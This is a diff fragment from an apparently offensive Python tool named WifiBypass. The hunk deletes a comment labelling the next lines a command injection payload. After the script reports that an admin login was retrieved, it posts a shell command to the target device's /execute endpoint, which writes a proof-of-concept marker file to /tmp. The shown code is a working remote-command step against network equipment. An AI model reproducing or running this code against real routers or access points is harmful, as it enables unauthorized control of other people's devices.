@@ -161,8 +161,6 @@ class WifiBypass:
 
             if "Welcome" in login_response.text or login_response.status_code == 200:
                 print("[INFO] Login admin retrieved [+]")
-
-                # Command injection payload
                 payload_url = f"http://{ip}/execute"
                 payload_data = {"cmd": "echo 'Gabriel Attack successful' > /tmp/gabriel.txt"}
                 payload_response = session.post(payload_url, data=payload_data)
